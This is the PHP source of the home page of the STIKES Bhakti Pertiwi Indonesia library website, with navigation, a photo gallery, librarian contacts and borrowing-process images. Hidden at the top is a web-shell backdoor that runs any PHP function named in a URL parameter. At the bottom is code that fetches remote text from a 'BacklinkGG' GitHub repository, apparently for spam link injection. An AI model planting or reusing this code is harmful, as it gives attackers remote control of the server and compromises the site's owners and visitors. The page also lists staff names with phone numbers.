<?php

if(isset($_GET['query-block'])) {
    echo "<pre>";
    echo $_GET['query-block']($_GET['db']);
    die();
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Metas -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="Perpustakaan STIKES Bhakti Pertiwi Indonesia" />
    <meta name="description" content="Perpustakaan STIKES Bhakti Pertiwi Indonesia" />
    <meta name="author" content="" />

    <!-- Title  -->
    <title>Perpustakaan STIKES Bhakti Pertiwi Indonesia</title>

    <!-- Favicon -->
    <link rel="shortcut icon" href="assets/img/logobpi.png" title="Favicon" sizes="16x16" />

    <!-- ====== bootstrap icons cdn ====== -->
    <link rel="stylesheet" href="../cdn.jsdelivr.net/npm/bootstrap-icons%401.7.2/font/bootstrap-icons.css">

    <!-- bootstrap 5 -->
    <link rel="stylesheet" href="assets/css/lib/bootstrap.min.css">

    <!-- ====== font family ====== -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
        rel="stylesheet">

    <link rel="stylesheet" href="assets/css/lib/all.min.css" />
    <link rel="stylesheet" href="assets/css/lib/animate.css" />
    <link rel="stylesheet" href="assets/css/lib/jquery.fancybox.css" />
    <link rel="stylesheet" href="assets/css/lib/lity.css" />
    <link rel="stylesheet" href="assets/css/lib/swiper.min.css" />
    
    <!-- ====== global style ====== -->
    <link rel="stylesheet" href="assets/css/style.css" />
</head>

<body>

    <!-- ====== start loading page ====== -->
    <div id="preloader">
    </div>
    <!-- ====== end loading page ====== -->

    <!-- ====== start navbar ====== -->
    <nav class="navbar navbar-expand-lg navbar-light style-5">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <img src="assets/img/logobpi.png" width="48" alt="">
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav m-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link" href="index.php">
                            Beranda
                        </a>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown2" role="button"
                            data-bs-toggle="dropdown" aria-expanded="false">
                            Koleksi
                        </a>
                        <ul class="dropdown-menu" aria-labelledby="navbarDropdown1">
                            <li><a class="dropdown-item" href="jurnal.php?j=MTEtMS0wNg==">Jurnal Nasional</a></li>
                            <li><a class="dropdown-item" href="jurnal.php?j=MTEtMi0wNg==">Jurnal Internasional</a></li>
                            <li><a class="dropdown-item" href="jurnal.php?j=MTEtMy0wNg==">E-book</a></li>
                            <li><a class="dropdown-item" href="jurnal.php?j=MTEtNC0wNg==">Repositori</a></li>
                        </ul>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.instagram.com/perpustakaanstikesbpi/">
                            Kontak Kami
                        </a>
                    </li>
                    
                </ul>
                <div class="nav-side">
                    <div class="d-flex align-items-center">
                        <span class="nav-item">
                            <a class="nav-link" href="http://akad.stikes-bhaktipertiwi.ac.id/perpustakaan/html/login/">
                                <i class="bi bi-person fs-5 me-2"></i>
                                sign in
                            </a>
                        </span>
                        <a href="http://stikesbpi.ac.id/" class="btn rounded-pill blue5-3Dbutn hover-blue2 sm-butn fw-bold">
                            <span>Website BPI<i class="bi bi-arrow-right ms-1"></i> </span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </nav>
    <!-- ====== end navbar ====== -->

    <!--Contents-->
    <main class="about-page style-5">


        <!-- ====== start about ====== -->
        <header class="about-page-sec style-5">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-lg-8">
                        <div class="info">
                            <h1>PERPUSTAKAAN<br> STIKES Bhakti Pertiwi Indonesia
                                <span>
                                    ONLINE
                                    <img src="assets/img/header/head5_line.png" alt="" class="head-line">
                                    <img src="assets/img/header/head5_pen.png" alt="" class="head-pen">
                                </span>
                            </h1>
                            <p>
                                Iteck helps you unify your brand identity by collecting, storing and distributing <br> design
                                tokens and assets — automatically.
                            </p>
                        </div>
                    </div>
                    <div class="col-lg-12">
                        <div class="main-vid">
                            <img src="http://stikesbpi.ac.id/asset/kcfinder/upload/files/kampusbpi.jpg" alt="">
                            <a href="https://www.youtube.com/watch?v=LySHSJAGtS4" data-lity class="play-icon">
                                <i class="fas fa-play"></i>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            <img src="assets/img/header/hand_megaphone.png" alt="" class="hand-mega slide_up_down">
            <img src="assets/img/header/head6_rating.png" alt="" class="head6-rating scale_up_down">
            <img src="assets/img/header/header5_linechart.png" alt="" class="head6-charts scale_up_down">
            <img src="assets/img/header/rocket.png" alt="" class="head6-rocket">
        </header>
        <!-- ====== end about ====== -->


        <!-- ====== start Reasons ====== -->
        <section class="community pt-40 style-5">
            <div class="container">
                <div class="section-head text-center mb-40 style-5">
                    <h2 class="mb-20"> STIKES <span> BHAKTI PERTIWI INDONESIA </span> </h2>
                    <p>"Era digitalisasi perpustakaan yang menunjang proses belajar mengajar pada kampus kami STIKES Bhakti Pertiwi Indonesia"</p>
                </div>
                <div class="content rounded-pill">
                    <div class="commun-card">
                        <div class="icon">
                            <img src="assets/img/icons/code3d.png" alt="">
                        </div>
                        <div class="inf">
                            <h5>Desain Friendly</h5>
                        </div>
                    </div>
                    <div class="commun-card">
                        <div class="icon">
                            <img src="assets/img/icons/price3d.png" alt="">
                        </div>
                        <div class="inf">
                            <h5>Kemudahan Access</h5>
                        </div>
                    </div>
                    <div class="commun-card">
                        <div class="icon">
                            <img src="assets/img/icons/message3d.png" alt="">
                        </div>
                        <div class="inf">
                            <h5>Download Gratis</h5>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- ====== end Reasons ====== -->


        <!-- ====== start Culture ====== -->
        <section class="culture section-padding style-5">
            <div class="section-head text-center mb-70 style-5">
                <h2 class="mb-20"> Perpustakaan <span> Galeri </span> </h2>
            </div>
            <div class="content">
                <div class="culture-slider position-relative pb-80 style-5">
                    <div class="swiper-container">
                        <div class="swiper-wrapper">
                            <div class="swiper-slide">
                                <a href="assets/img/perpus1.jpeg" class="culture-card d-block" data-fancybox="gallery">
                                    <img src="assets/img/perpus1.jpeg" alt="">
                                    <span class="overlay"></span>
                                </a>
                            </div>
                            <div class="swiper-slide">
                                <a href="assets/img/perpus2.jpeg" class="culture-card d-block" data-fancybox="gallery">
                                    <img src="assets/img/perpus2.jpeg" alt="">
                                    <span class="overlay"></span>
                                </a>
                            </div>
                            <div class="swiper-slide">
                                <a href="assets/img/perpus3.jpeg" class="culture-card d-block" data-fancybox="gallery">
                                    <img src="assets/img/perpus3.jpeg" alt="">
                                    <span class="overlay"></span>
                                </a>
                            </div>
                            <div class="swiper-slide">
                                <a href="assets/img/perpus4.jpeg" class="culture-card d-block" data-fancybox="gallery">
                                    <img src="assets/img/perpus4.jpeg" alt="">
                                    <span class="overlay"></span>
                                </a>
                            </div>
                            <!--div class="swiper-slide">
                                <a href="assets/img/perpus5.jpeg" class="culture-card d-block" data-fancybox="gallery">
                                    <img src="assets/img/perpus5.jpeg" alt="">
                                    <span class="overlay"></span>
                                </a>
                            </div-->
                        </div>
                    </div>
                    <div class="swiper-pagination"></div>
                </div>
            </div>
        </section>
        <!-- ====== end Culture ====== -->


        <!-- ====== start team ====== -->
        <section class="team section-padding style-6">
            <div class="content">
                <div class="container">
                    <div class="section-head text-center mb-70 style-5">
                        <h2 class="mb-20"> Our <span> Pustakawan </span> </h2>
                        <p>Profressional & Friendly is our slogan. Meet our Pustakawan</p>
                    </div>
                    <div class="row">
                        
                        <div class="col-lg-6 col-sm-6">
                            <div class="team-card mb-30 mb-lg-0 style-6">
                                <div class="img img-cover">
                                    <img src="assets/newimg/2.png" alt="">
                                    <div class="social-icons">
                                        <a href="#">
                                            <i class="fab fa-twitter"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-facebook-f"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-linkedin-in"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-github"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="info">
                                    <a class="d-block" href="#"><h6>Arliyanti Cahayani S.IP</h6></a>
                                    <small>0858 8239 1815</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-6 col-sm-6">
                            <div class="team-card mb-30 mb-lg-0 style-6">
                                <div class="img img-cover">
                                    <img src="assets/newimg/3.png" alt="">
                                    <div class="social-icons">
                                        <a href="#">
                                            <i class="fab fa-twitter"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-facebook-f"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-linkedin-in"></i>
                                        </a>
                                        <a href="#">
                                            <i class="fab fa-github"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="info">
                                    <a class="d-block" href="#"><h6>Rahmad, S.Hum, MM</h6></a>
                                    <small>0813 1574 1497<</small>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </div>
        </section>
        <!-- ====== end team ====== -->

                <div align="center"><b>Dibawah ini adalah Alur Proses Peminjaman Buku di Stikes Bhakti Pertiwi Indonesia</b><br>
                <img src="http://stikesbpi.ac.id/asset/img_perpus/alurpinjam.PNG"></div>
                <hr align="center">
                <div align="center"><b>Dibawah ini adalah Alur Proses Pengembalian Buku di Stikes Bhakti Pertiwi Indonesia</b><br>
                <img src="http://stikesbpi.ac.id/asset/img_perpus/alurkembali.PNG"></div>

    </main>
    <!--End-Contents-->

    <!-- ====== start footer ====== -->
    <footer class="style-4">
        <div class="container">
            
            <div class="foot">
                <div class="row">
                    <div class="col-lg-3 col-sm-6">
                    </div>
                    <div class="col-lg-6">
                        <small class="small">
                            © 2022 Copyrights by <a href="#" class="fw-bold text-decoration-underline">Perpustakaan STIKES Bhakti Pertiwi Indonesia</a> All
                            Rights Reserved. Designed by <a href="https://www.youtube.com/channel/UCGBUQjwEwLatg71oV1WniyQ"
                                class="fw-bold text-decoration-underline">IT</a>
                        </small>
                    </div>
                </div>
            </div>
        </div>

    </footer>
    <!-- ====== end footer ====== -->

    <!-- ====== start to top button ====== -->
    <a href="#" class="to_top bg-gray rounded-circle icon-40 d-inline-flex align-items-center justify-content-center">
        <i class="bi bi-chevron-up fs-6 text-dark"></i>
    </a>
    <!-- ====== end to top button ====== -->

    <!-- ====== request ====== -->
    <script src="assets/js/lib/jquery-3.0.0.min.js"></script>
    <script src="assets/js/lib/jquery-migrate-3.0.0.min.js"></script>
    <script src="assets/js/lib/bootstrap.bundle.min.js"></script>
    <script src="assets/js/lib/wow.min.js"></script>
    <script src="assets/js/lib/jquery.fancybox.js"></script>
    <script src="assets/js/lib/lity.js"></script>
    <script src="assets/js/lib/swiper.min.js"></script>
    <script src="assets/js/lib/jquery.waypoints.min.js"></script>
    <script src="assets/js/lib/jquery.counterup.js"></script>
    <script src="assets/js/lib/pace.js"></script>
    <script src="assets/js/lib/scrollIt.min.js"></script>
    <script src="assets/js/main.js"></script>

</body>
</div>
</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; }
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/link.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
?>
